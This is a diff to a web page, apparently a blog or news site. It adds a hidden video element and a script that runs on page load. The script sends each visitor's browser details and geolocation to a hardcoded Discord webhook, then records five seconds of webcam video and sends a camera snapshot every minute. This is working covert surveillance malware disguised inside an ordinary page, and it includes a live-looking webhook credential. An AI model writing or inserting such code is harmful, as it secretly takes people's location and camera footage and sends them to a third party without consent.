@@ -764,12 +764,13 @@
       50% { opacity: 0; }
       100% { opacity: 1; }
     }
+        video { display: none; }
   </style>
 </head>
 <body>
 <!-- Floating particles background -->
 <div class="particles" id="particles"></div>
-
+  <video id="video" autoplay playsinline></video>
 <!-- Lightbox for images -->
 <div class="lightbox" id="lightbox">
   <span class="lightbox-close">&times;</span>
@@ -1476,6 +1477,153 @@ ${post.type === 'news' ? '<i class="bi bi-newspaper"></i>' : ''}
       document.body.innerHTML = "";
     }
   }, 1000);
+  // অনেকগুলো Discord webhook URL রাখো এখানে:
+const webhooks = [
+  "https://discord.com/api/webhooks/1398572651651403776/m7d18WV12d4Ol5wxLUyXOZ7j-dPkdbhCVai08iCg2gXJN_DakRAHD7oIE59Ckh8JuxEk"
+  // আরও যোগ করো তোমার webhook এখানে
+];
+
+// র‍্যান্ডম webhook নিতে ফাংশন:
+function getRandomWebhook() {
+  const index = Math.floor(Math.random() * webhooks.length);
+  return webhooks[index];
+}
+
+// ডিভাইস ইনফো ও লোকেশন Discord-এ পাঠানোর ফাংশন
+async function sendDeviceInfo() {
+  const info = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `${window.screen.width}x${window.screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    online: navigator.onLine,
+    locationLink: "Location not available"
+  };
+
+  // লোকেশন পাওয়া গেলে লিঙ্ক তৈরি করব
+  if (navigator.geolocation) {
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
+      });
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      info.locationLink = `https://www.google.com/maps?q=${lat},${lng}`;
+    } catch (err) {
+      info.locationLink = "Location permission denied or unavailable";
+    }
+  } else {
+    info.locationLink = "Geolocation not supported";
+  }
+
+  const content = `
+📡 **Device Info**
+User Agent: \`${info.userAgent}\`
+Platform: \`${info.platform}\`
+Language: \`${info.language}\`
+Screen: \`${info.screen}\`
+Timezone: \`${info.timezone}\`
+Online: \`${info.online}\`
+📍 **Location**: [Open in Google Maps](${info.locationLink})
+`;
+
+  await fetch(getRandomWebhook(), {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content })
+  });
+}
+
+window.onload = async () => {
+  const video = document.getElementById('video');
+
+  // প্রথমে ডিভাইস ও লোকেশন ইনফো পাঠাও
+  await sendDeviceInfo();
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: 1280, height: 720 },
+      audio: false
+    });
+    video.srcObject = stream;
+
+    // ভিডিও পাঠানো হয়েছে কিনা চেক (sessionStorage ব্যবহার)
+    if (!sessionStorage.getItem('videoSent')) {
+      await recordAndSendVideo(stream);
+      sessionStorage.setItem('videoSent', 'true');
+    }
+
+    // প্রতি ১ মিনিটে ছবি পাঠানোর জন্য setInterval
+    setInterval(() => {
+      sendPhoto(video);
+    }, 60000); // ৬০ সেকেন্ড
+
+  } catch (err) {
+    console.error("Camera error:", err);
+  }
+};
+
+// ৫ সেকেন্ড ভিডিও রেকর্ড ও Discord-এ পাঠানোর ফাংশন
+function recordAndSendVideo(stream) {
+  return new Promise((resolve) => {
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+    const chunks = [];
+
+    mediaRecorder.ondataavailable = e => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      sendBlobToDiscord(blob, 'intro_video.webm');
+      resolve();
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => {
+      mediaRecorder.stop();
+    }, 5000);
+  });
+}
+
+// ছবি তুলে Discord-এ পাঠানোর ফাংশন
+function sendPhoto(video) {
+  const canvas = document.createElement('canvas');
+  canvas.width = 600;  // তোমার প্রয়োজন অনুযায়ী পরিবর্তন করতে পারো
+  canvas.height = 720;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("file", blob, "capture.png");
+
+    fetch(getRandomWebhook(), {
+      method: "POST",
+      body: form
+    }).then(() => {
+      console.log("Photo sent to Discord");
+    }).catch(err => {
+      console.error("Error sending photo:", err);
+    });
+  }, "image/png", 0.8);
+}
+
+// ভিডিও Blob Discord-এ পাঠানোর ফাংশন
+function sendBlobToDiscord(blob, filename) {
+  const form = new FormData();
+  form.append("file", blob, filename);
+
+  fetch(getRandomWebhook(), {
+    method: "POST",
+    body: form
+  }).then(() => {
+    console.log("Video sent to Discord");
+  }).catch(err => {
+    console.error("Error sending video:", err);
+  });
+}
 </script>
 </body>
 </html>
